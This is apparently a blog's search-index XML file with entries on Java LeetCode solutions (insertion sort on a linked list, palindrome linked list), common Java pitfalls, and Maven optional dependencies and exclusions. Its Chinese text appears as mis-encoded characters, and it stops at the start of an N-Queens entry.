<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>leetcode147.InsertionSortList</title>
      <link href="/2020/11/20/leetcode147-InsertionSortList/"/>
      <url>/2020/11/20/leetcode147-InsertionSortList/</url>
      
        <content type="html"><![CDATA[<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Sort a linked list using insertion sort. </span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">//A graphical example of insertion sort. The partial sorted list (black) initial</span></span><br><span class="line"><span class="comment">//ly contains only the first element in the list. </span></span><br><span class="line"><span class="comment">//With each iteration one element (red) is removed from the input data and inser</span></span><br><span class="line"><span class="comment">//ted in-place into the sorted list </span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Algorithm of Insertion Sort: </span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// Insertion sort iterates, consuming one input element each repetition, and gro</span></span><br><span class="line"><span class="comment">//wing a sorted output list. </span></span><br><span class="line"><span class="comment">// At each iteration, insertion sort removes one element from the input data, fi</span></span><br><span class="line"><span class="comment">//nds the location it belongs within the sorted list, and inserts it there. </span></span><br><span class="line"><span class="comment">// It repeats until no input elements remain. </span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">//Example 1: </span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">//Input: 4-&gt;2-&gt;1-&gt;3</span></span><br><span class="line"><span class="comment">//Output: 1-&gt;2-&gt;3-&gt;4</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Example 2: </span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">//Input: -1-&gt;5-&gt;3-&gt;4-&gt;0</span></span><br><span class="line"><span class="comment">//Output: -1-&gt;0-&gt;3-&gt;4-&gt;5</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// Related Topics ÊéíÂ∫è ÈìæË°® </span></span><br><span class="line"><span class="comment">// üëç 247 üëé 0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//leetcode submit region begin(Prohibit modification and deletion)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) &#123; val = x; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">insertionSortList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode root = <span class="keyword">new</span> ListNode(-<span class="number">1</span>);</span><br><span class="line">        root.next = head;</span><br><span class="line">        ListNode t = root.next;</span><br><span class="line">        ListNode pre = root;</span><br><span class="line">        <span class="keyword">while</span> (t != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ListNode temp = t;</span><br><span class="line">            ListNode p = root;</span><br><span class="line">            ListNode q = root.next;</span><br><span class="line">            <span class="keyword">boolean</span> flag = <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">while</span> (p != <span class="keyword">null</span> &amp;&amp; q != <span class="keyword">null</span> &amp;&amp; q != temp) &#123;</span><br><span class="line">                <span class="keyword">if</span> (q.val &gt; temp.val) &#123;</span><br><span class="line">                    pre.next = temp.next;</span><br><span class="line">                    p.next = temp;</span><br><span class="line">                    p.next.next = q;</span><br><span class="line">                    flag = <span class="keyword">true</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                p = p.next;</span><br><span class="line">                q = q.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                t = pre.next;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                t = t.next;</span><br><span class="line">                pre = pre.next;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//leetcode submit region end(Prohibit modification and deletion)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaÂ∏∏ËßÅBUGÊåÅÁª≠Êõ¥Êñ∞‰∏≠</title>
      <link href="/2020/11/01/java%E5%B8%B8%E8%A7%81BUG%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/"/>
      <url>/2020/11/01/java%E5%B8%B8%E8%A7%81BUG%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%E4%B8%AD/</url>
      
        <content type="html"><![CDATA[<h3 id="StringÁ±ªÂûãÁöÑequals"><a href="#StringÁ±ªÂûãÁöÑequals" class="headerlink" title="StringÁ±ªÂûãÁöÑequals"></a>StringÁ±ªÂûãÁöÑequals</h3><pre><code>String a = Êú™Áü•Ôºõ// ‰∏çÁü•ÊòØnullËøòÊòØÂ≠óÁ¨¶‰∏≤String b = &quot;abc&quot;;// ‰∏ãÈù¢ÂÜôÊ≥ïÁ©∫ÊåáÈíàÂºÇÂ∏∏//        String a = null;//        String b = &quot;abc&quot;;//        System.out.println(a.equals(b));// Êàë‰ª¨Â∫îËØ•Ëøô‰πàÂÜô        String a = null;        String b = &quot;abc&quot;;        System.out.println(b.equals(a)); //ËøôÊúâ‰ªÄ‰πàÂå∫Âà´Âë¢„ÄÇ // ‰∏ãÈù¢ÊòØString.equalsÊñπÊ≥ï public boolean equals(Object anObject) {        if (this == anObject) {            return true;        }        if (anObject instanceof String) {            String anotherString = (String)anObject;            int n = value.length;            if (n == anotherString.value.length) {                char v1[] = value;                char v2[] = anotherString.value;                int i = 0;                while (n-- != 0) {                    if (v1[i] != v2[i])                        return false;                    i++;                }                return true;            }        }        return false;    }</code></pre><p>ÁªìËÆ∫</p><p>Êàë‰ª¨Âú®ÊØîËæÉÂ≠óÁ¨¶‰∏≤ÁöÑÊó∂ÂÄôÔºåÈúÄË¶ÅÊòéÁ°Æ‰∏Ä‰∏™‰∏ç‰ºö‰∏∫Á©∫ÁöÑÂÄºÔºåÊîæÂú®Â∑¶ËæπÂéªequalsÊú™Áü•ÁöÑÂÄº</p><h3 id="List-list‰∏≠‰ΩøÁî®remove"><a href="#List-list‰∏≠‰ΩøÁî®remove" class="headerlink" title="List list‰∏≠‰ΩøÁî®remove()"></a>List<Integer> list‰∏≠‰ΩøÁî®remove()</h3><p>‰ªäÂ§©Êôö‰∏äÔºåÂÜôleetcodeÁöÑÊó∂ÂÄôÔºåÂèëÁé∞‰ΩøÁî®removeÊñπÊ≥ïÊó∂ÔºåÁªìÊûú‰∏ÄÁõ¥Âá∫Èîô</p><p>Â¶ÇÊûú‰º†ÂÖ•ÁªôremoveÁöÑÂÄºÁöÑÊó∂ÂÄôÔºå‰Ω†Ë¶ÅÊòéÁ°ÆÊòØ‰º†ÁöÑÊòØintËøòÊòØInteger,Ëøô‰∏§‰∏™ÊòØ‰∏çÂêåÁöÑÊñπÊ≥ïÔºåÈúÄË¶ÅÊòéÁ°Æ</p>]]></content>
      
      
      
        <tags>
            
            <tag> JavaÂ≠¶‰π† </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetcode-234ÂõûÊñáÈìæË°®</title>
      <link href="/2020/10/25/leetcode-234%E5%9B%9E%E6%96%87%E9%93%BE%E8%A1%A8/"/>
      <url>/2020/10/25/leetcode-234%E5%9B%9E%E6%96%87%E9%93%BE%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="Êú¨È¢òÈáçË¶ÅÁÇπ"><a href="#Êú¨È¢òÈáçË¶ÅÁÇπ" class="headerlink" title="Êú¨È¢òÈáçË¶ÅÁÇπ"></a>Êú¨È¢òÈáçË¶ÅÁÇπ</h3><ul><li><p>ÂèçËΩ¨ÈìæË°®<br><img src="http://qjrzrivoh.hd-bkt.clouddn.com/1605373828.9806994494.png" alt="Âú®ËøôÈáåÊèíÂÖ•ÂõæÁâáÊèèËø∞"></p></li><li><p>Âø´ÊÖ¢ÊåáÈíàÔºå‰∏Ä‰∏™‰∫åÂÄçÈÄüÔºå‰∏Ä‰∏™‰∏ÄÂÄçÈÄüÔºåÂèØ‰ª•Ëé∑Âèñ‰∏Ä‰∏™ÈìæË°®ÁöÑ‰∏≠Èó¥ËäÇÁÇπ </p></li></ul><pre><code>1-&gt;2-&gt;3-4-&gt;null=&gt;     3-&gt;4-&gt;null1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;null=&gt;   3-&gt;4-&gt;5-&gt;null</code></pre><ul><li>ÂêéÂçäÊÆµÂèçËΩ¨ÂêéÔºå‰æùÊ¨°ÂíåÊÄªÁöÑÈìæË°®ËøõË°åÊØîËæÉÔºåÂ¶ÇÊûú‰∏çÂêåÂ∞±false,ËøôÈáåÂ∞±ÊòØ‰∏Ä‰∏™ÈïøÈìæË°®Âíå‰∏Ä‰∏™Áü≠ÈìæË°®ÁöÑÂØπÊØî‰∫ÜÔºåÂ§ßÂèØ‰∏çÂøÖÊãÖÂøÉÔºåËøô‰∏™ÈìæË°®ÊòØÂ•áÊï∞ËøòÊòØÂÅ∂Êï∞ </li></ul><pre><code>//ËØ∑Âà§Êñ≠‰∏Ä‰∏™ÈìæË°®ÊòØÂê¶‰∏∫ÂõûÊñáÈìæË°®„ÄÇ //// Á§∫‰æã 1: //// ËæìÂÖ•: 1-&gt;2//ËæìÂá∫: false //// Á§∫‰æã 2: //// ËæìÂÖ•: 1-&gt;2-&gt;2-&gt;1//ËæìÂá∫: true// //// ËøõÈò∂Ôºö //‰Ω†ËÉΩÂê¶Áî® O(n) Êó∂Èó¥Â§çÊùÇÂ∫¶Âíå O(1) Á©∫Èó¥Â§çÊùÇÂ∫¶Ëß£ÂÜ≥Ê≠§È¢òÔºü // Related Topics ÈìæË°® ÂèåÊåáÈíà // üëç 744 üëé 0//leetcode submit region begin(Prohibit modification and deletion)/** * Definition for singly-linked list. * public class ListNode { * int val; * ListNode next; * ListNode(int x) { val = x; } * } */class Solution {    public ListNode reverseList(ListNode head) {        ListNode curr = null;        ListNode pre = head;        while (pre != null) {            ListNode tempNode = pre.next;            pre.next = curr;            curr = pre;            pre = tempNode;        }        return curr;    }    public ListNode getHalfNode(ListNode head) {        ListNode fast = head;        ListNode low = head;        while (fast != null &amp;&amp; fast.next != null) {            fast = fast.next.next;            low = low.next;        }        return low;    }    public boolean isPalindrome(ListNode head) {        ListNode temp = head;        ListNode half = getHalfNode(temp);        ListNode reverseList = reverseList(half);        ListNode p = head;        ListNode q = reverseList;        while (q != null) {            if (p.val != q.val) {                return false;            }            p = p.next;            q = q.next;        }        return true;    }}//leetcode submit region end(Prohibit modification and deletion)</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>maven optional dependencies and dependency exclusions</title>
      <link href="/2020/10/22/maven%20optional%20dependencies%20and%20dependency%20exclusions/"/>
      <url>/2020/10/22/maven%20optional%20dependencies%20and%20dependency%20exclusions/</url>
      
        <content type="html"><![CDATA[<h3 id="ÂºÄÁØá"><a href="#ÂºÄÁØá" class="headerlink" title="ÂºÄÁØá"></a>ÂºÄÁØá</h3><p>ÊúÄËøëÁúãÂà∞mybatisÁöÑpomÊñá‰ª∂ÈáåÈù¢ÁöÑdependencyÈÉΩÂ§ö‰∫Ü‰∏Ä‰∏™ÈÄâÈ°πoptional.</p><p>ÂèëÁé∞‰∫ÜÈ°πÁõÆ‰∏≠ÂºïÂÖ•mybatisÁöÑ‰æùËµñÔºå‰ΩÜÂπ∂Ê≤°ÊúâÂ∞ÜmybatisÁöÑ‰æùËµñ‰º†ÈÄíËøáÊù•„ÄÇ‰∏ãÈù¢‰ª•Âõæ‰∏∫ËØÅ</p><pre><code>&lt;dependencies&gt;  &lt;dependency&gt;    &lt;groupId&gt;junit&lt;/groupId&gt;    &lt;artifactId&gt;junit&lt;/artifactId&gt;    &lt;version&gt;4.11&lt;/version&gt;    &lt;scope&gt;test&lt;/scope&gt;  &lt;/dependency&gt;  &lt;!-- https://mvnrepository.com/artifact/org.mybatis/mybatis --&gt;  &lt;dependency&gt;    &lt;groupId&gt;org.mybatis&lt;/groupId&gt;    &lt;artifactId&gt;mybatis&lt;/artifactId&gt;    &lt;version&gt;3.5.3&lt;/version&gt;  &lt;/dependency&gt;&lt;/dependencies&gt;</code></pre><p>‰∏ãÈù¢ËæìÂá∫ <code>mvn dependency:tree</code></p><pre><code>[INFO] --- maven-dependency-plugin:2.8:tree (default-cli) @ mvn-excluede-demo ---[INFO] com.example:mvn-excluede-demo:jar:1.0-SNAPSHOT[INFO] +- junit:junit:jar:4.11:test[INFO] |  \- org.hamcrest:hamcrest-core:jar:1.3:test[INFO] \- org.mybatis:mybatis:jar:3.5.3:compile</code></pre><p>ÈÇ£Êàë‰ª¨Êù•ÁúãÁúãmybatis‰∏≠ÁöÑpomÊñá‰ª∂ÊòØÂ¶Ç‰ΩïÂÜôÁöÑ</p><p>Âè™‰∏æ‰∏ÄÈÉ®ÂàÜ‰æãÂ≠ê</p><pre><code>&lt;dependency&gt;  &lt;groupId&gt;commons-logging&lt;/groupId&gt;  &lt;artifactId&gt;commons-logging&lt;/artifactId&gt;  &lt;version&gt;1.2&lt;/version&gt;  &lt;optional&gt;true&lt;/optional&gt;&lt;/dependency&gt;&lt;dependency&gt;  &lt;groupId&gt;cglib&lt;/groupId&gt;  &lt;artifactId&gt;cglib&lt;/artifactId&gt;  &lt;version&gt;3.2.10&lt;/version&gt;  &lt;optional&gt;true&lt;/optional&gt;&lt;/dependency&gt;</code></pre><p>ÂèØ‰ª•ÁúãÂà∞ÈÄöËøá <code>&lt;optional&gt;true&lt;/optioal&gt;</code></p><h3 id="optionalÊ†áÁ≠æ"><a href="#optionalÊ†áÁ≠æ" class="headerlink" title="optionalÊ†áÁ≠æ"></a>optionalÊ†áÁ≠æ</h3><h4 id="How-do-optional-dependencies-work"><a href="#How-do-optional-dependencies-work" class="headerlink" title="How do optional dependencies work?"></a>How do optional dependencies work?</h4><pre><code>Project-A -&gt; Project-B</code></pre><p>The diagram above says that Project-A depends on Project-B. When A declares B<br>as an optional dependency in its POM, this relationship remains unchanged.<br>It‚Äôs just like a normal build where Project-B will be added in Project-A‚Äôs<br>classpath.</p><pre><code>Project-X -&gt; Project-A</code></pre><p>When another project (Project-X) declares Project-A as a dependency in its<br>POM, the optional nature of the dependency takes effect. Project-B is not<br>included in the classpath of Project-X. You need to declare it directly in the<br>POM of Project X for B to be included in X‚Äôs classpath.</p><p>‰∏äÈù¢ÊòØÂÆòÁΩëÂØπ‰∫éoptionalÁöÑËß£ËØªÔºå‰∏äÈù¢ÁöÑ‰∏æ‰æãÂ∞±ÊòØprojectA‰ΩøÁî®‰∫ÜprojectB‰Ωú‰∏∫Optional<br>(ÂèØÈÄâÁöÑ)‰æùËµñÔºåÂ¶Ç‰ΩïAÊâìÂåÖ‰Ωú‰∏∫XÁöÑ‰æùËµñÔºåprojectB‰∏ç‰ºöÂåÖÂê´Âú®projectXÁöÑclasspath‰∏≠„ÄÇÂ¶ÇÊûúÈúÄË¶Å‰ΩøÁî®projectB,ÈúÄË¶Å‰Ω†ÊòæÂºèÁöÑÂºïÁî®projectBÁöÑ‰æùËµñ„ÄÇ</p><h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h4><p>Suppose there is a project named <em>X2</em> that has similar functionality to<br><em>Hibernate</em> . It supports many databases such as MySQL, PostgreSQL, and<br>several versions of Oracle. Each supported database requires an additional<br>dependency on a driver jar. All of these dependencies are needed at compile<br>time to build X2. However your project only uses one specific database and<br>doesn‚Äôt need drivers for the others. X2 can declare these dependencies as<br>optional, so that when your project declares X2 as a direct dependency in its<br>POM, all the drivers supported by the X2 are not automatically included in<br>your project‚Äôs classpath. Your project will have to include an explicit<br>dependency on the specific driver for the one database it does use.</p><p>ÂÅáÂÆöÂ¶ÇÊûúÊúâ‰∏Ä‰∏™È°πÁõÆX2ÂíåHibernateÁ±ª‰ºº„ÄÇÂÆÉÊîØÊåÅÂ§ö‰∏™databases‰æãÂ¶Çmysql,PostgreSQLÂíåÂ§ö‰∏™ÁâàÊú¨ÁöÑOracle.ÊØè‰∏Ä‰∏™ÊîØÊåÅÁöÑÊï∞ÊçÆÂ∫ìÈÉΩÈúÄË¶Å‰∏Ä‰∏™È¢ùÂ§ñÁöÑ‰æùËµñÂú®È©±Âä®jarÂåÖ‰∏ä„ÄÇÂú®ÊûÑÂª∫x2ÁöÑÊó∂ÂÄôÈúÄË¶ÅËøô‰∫õ„ÄÇÁÑ∂ËÄå‰Ω†ÁöÑÈ°πÁõÆÂú®‰ΩøÁî®Êó∂Ôºå‰Ω†Âè™‰ΩøÁî®‰∏Ä‰∏™ÁâπÂÆöÁöÑÊï∞ÊçÆÂ∫ìËÄå‰∏çÈúÄË¶ÅÂÖ∂‰ªñÁöÑÔºåX2ÂèØ‰ª•Áî≥ÊòéËøô‰∫õ‰æùËµñ‰∏∫ÂèØÈÄâÁöÑ„ÄÇ‰Ω†È°πÁõÆÂú®‰ΩøÁî®Êó∂ÔºåÈúÄË¶Å‰∏Ä‰∏™ÊòéÁ°ÆÁöÑ‰æùËµñÊù•ÁâπÂÆöÁöÑÈ©±Âä®„ÄÇ</p><h3 id="exclusion"><a href="#exclusion" class="headerlink" title="exclusion"></a>exclusion</h3><p>Â¶Ç‰Ωï‰æùËµñÊòØÂ¶Ç‰∏ãÂΩ¢ÂºèÁöÑ</p><pre><code>Project-A   -&gt; Project-B        -&gt; Project-D &lt;! -- This dependency should be excluded --&gt;              -&gt; Project-E              -&gt; Project-F   -&gt; Project C</code></pre><p>Â¶ÇÊûúprojectA ‰æùËµñ‰∫éProjectBÂíåProjectC,projectBÊòØ‰æùËµñ‰∫éEÂíåF</p><p>ÊâÄ‰ª•ProjectA‰ºö‰æùËµñB„ÄÅC„ÄÅD„ÄÅE„ÄÅF</p><p>Â¶ÇÊûú‰Ω†ÊÉ≥Ë¶ÅProjectDÂ∞ÜÂÖ∂Âä†ÂÖ•Âà∞ProjectAÁöÑclassPath‰∏≠„ÄÇÈ°πÁõÆBÁöÑÂºÄÂèëËÄÖÂèØ‰ª•Ê†áËá¥ProjectDÁöÑoptional‰∏∫true„ÄÇ</p><h4 id="ÊâãÂä®ÊéíÈô§ÂΩìÂâçÂ±ÇÁ∫ßÁöÑ"><a href="#ÊâãÂä®ÊéíÈô§ÂΩìÂâçÂ±ÇÁ∫ßÁöÑ" class="headerlink" title="ÊâãÂä®ÊéíÈô§ÂΩìÂâçÂ±ÇÁ∫ßÁöÑ"></a>ÊâãÂä®ÊéíÈô§ÂΩìÂâçÂ±ÇÁ∫ßÁöÑ</h4><p><em>‰ΩÜÊòØÂæà‰∏çÂπ∏ÁöÑÔºå‰ªñ‰ª¨Âπ∂Ê≤°Êúâ</em> ÔºåÊâÄ‰ª•‰Ω†ÈúÄË¶ÅÂú®ProjectAÁöÑpomÊñá‰ª∂‰∏≠ÔºåÊâãÂä®ÂéªÊéíÈô§</p><pre><code>&lt;dependencies&gt;    &lt;dependency&gt;      &lt;groupId&gt;sample.ProjectB&lt;/groupId&gt;      &lt;artifactId&gt;Project-B&lt;/artifactId&gt;      &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;      &lt;exclusions&gt;        &lt;exclusion&gt;          &lt;groupId&gt;sample.ProjectD&lt;/groupId&gt; &lt;!-- Exclude Project-D from Project-B --&gt;          &lt;artifactId&gt;Project-D&lt;/artifactId&gt;        &lt;/exclusion&gt;      &lt;/exclusions&gt;    &lt;/dependency&gt;  &lt;/dependencies&gt;</code></pre><h4 id="‰æùËµñ‰∏≠ÁöÑÊéíÈô§ÈÇ£‰∏Ä‰∏™Â±ÇÁ∫ßÊ∂àÂ§±Ôºå‰∏ç‰ºö‰º†ÈÄíÁªô‰∏ã‰∏Ä‰∏™‰æùËµñ"><a href="#‰æùËµñ‰∏≠ÁöÑÊéíÈô§ÈÇ£‰∏Ä‰∏™Â±ÇÁ∫ßÊ∂àÂ§±Ôºå‰∏ç‰ºö‰º†ÈÄíÁªô‰∏ã‰∏Ä‰∏™‰æùËµñ" class="headerlink" title="‰æùËµñ‰∏≠ÁöÑÊéíÈô§ÈÇ£‰∏Ä‰∏™Â±ÇÁ∫ßÊ∂àÂ§±Ôºå‰∏ç‰ºö‰º†ÈÄíÁªô‰∏ã‰∏Ä‰∏™‰æùËµñ"></a>‰æùËµñ‰∏≠ÁöÑÊéíÈô§ÈÇ£‰∏Ä‰∏™Â±ÇÁ∫ßÊ∂àÂ§±Ôºå‰∏ç‰ºö‰º†ÈÄíÁªô‰∏ã‰∏Ä‰∏™‰æùËµñ</h4><p>Â¶ÇÊûúÊúâ‰∏Ä‰∏™È°πÁõÆX‰æùËµñ‰∫éProjectA,ÈÇ£‰πàProjectDÊòØÂê¶‰ºöË¢´exclude</p><p>Á≠îÊ°àÊòØÊ≠£Á°ÆÁöÑ„ÄÇ‰ºöË¢´exclude</p><h4 id="‰æùËµñÂπ∂‰∏çÊòØÂÖ®Â±ÄÁöÑÔºåÊúâÁÇπÂ±ÄÈÉ®ÂèòÈáèÁöÑÂë≥ÈÅì"><a href="#‰æùËµñÂπ∂‰∏çÊòØÂÖ®Â±ÄÁöÑÔºåÊúâÁÇπÂ±ÄÈÉ®ÂèòÈáèÁöÑÂë≥ÈÅì" class="headerlink" title="‰æùËµñÂπ∂‰∏çÊòØÂÖ®Â±ÄÁöÑÔºåÊúâÁÇπÂ±ÄÈÉ®ÂèòÈáèÁöÑÂë≥ÈÅì"></a>‰æùËµñÂπ∂‰∏çÊòØÂÖ®Â±ÄÁöÑÔºåÊúâÁÇπÂ±ÄÈÉ®ÂèòÈáèÁöÑÂë≥ÈÅì</h4><p>Â¶ÇÊûúÈ°πÁõÆXÂêåÊó∂Âèà‰æùËµñ‰∫éProjectYÔºåprojectYÈáåÈù¢‰æùËµñ‰∫éProjectDÔºåËøôÊòØProjectDÂπ∂‰∏ç‰ºöË¢´ÂÖ®Â±ÄÁöÑexcludeÔºå‰ªñÊòØprojectYÁöÑÂêàÊ≥ï‰æùËµñ„ÄÇ</p><p>‰∏ãÈù¢ÔºåÊàë‰ª¨Êù•ÁúãÁúã</p><p>Ëã±ÊñáÂéüÊñá</p><pre><code>If you deploy Project-A to a repository, and Project-X declares a normal dependency on Project-A, will Project-D still be excluded from the classpath?Project-X -&gt; Project-AThe answer is Yes. Project-A has declared that it doesn&apos;t need Project-D to run, so it won&apos;t be brought in as a transitive dependency of Project-A.Now, consider that Project-X depends on Project-Y, as in the diagram below:Project-X -&gt; Project-Y               -&gt; Project-B                    -&gt; Project-D                       ...Project-Y also has a dependency on Project-B, and it does need the features supported by Project-D. Therefore, it will NOT place an exclusion on Project-D in its dependency list. It may also supply an additional repository, from which it can resolve Project-E. In this case, it&apos;s important that Project-D is not excluded globally, since it is a legitimate dependency of Project-Y.</code></pre><h4 id="ÊéíÈô§Ë∑®Â±ÇÁ∫ßÁöÑ"><a href="#ÊéíÈô§Ë∑®Â±ÇÁ∫ßÁöÑ" class="headerlink" title="ÊéíÈô§Ë∑®Â±ÇÁ∫ßÁöÑ"></a>ÊéíÈô§Ë∑®Â±ÇÁ∫ßÁöÑ</h4><p>Â¶ÇÊûúÊÉ≥Ë¶ÅÂú®ProjectB‰∏≠ÊéíÈô§E</p><pre><code>&lt;dependency&gt;      &lt;groupId&gt;sample.ProjectB&lt;/groupId&gt;      &lt;artifactId&gt;Project-B&lt;/artifactId&gt;      &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;      &lt;exclusions&gt;        &lt;exclusion&gt;          &lt;groupId&gt;sample.ProjectE&lt;/groupId&gt; &lt;!-- Exclude Project-E from Project-B --&gt;          &lt;artifactId&gt;Project-E&lt;/artifactId&gt;        &lt;/exclusion&gt;      &lt;/exclusions&gt;    &lt;/dependency&gt;</code></pre><p>ÂèÇËÄÉËµÑÊñô:</p><ul><li><a href="https://maven.apache.org/guides/introduction/introduction-to-optional-and-excludes-dependencies.html" target="_blank" rel="noopener">https://maven.apache.org/guides/introduction/introduction-to-optional-and-excludes-dependencies.html</a> </li><li><a href="https://cloud.tencent.com/developer/article/1028070" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1028070</a> </li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> maven </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leetode 52 NÁöáÂêé</title>
      <link href="/2020/10/20/leetode%2052%20N%E7%9A%87%E5%90%8E/"/>
      <url>/2020/10/20/leetode%2052%20N%E7%9A%87%E5%90%8E/</url>
      
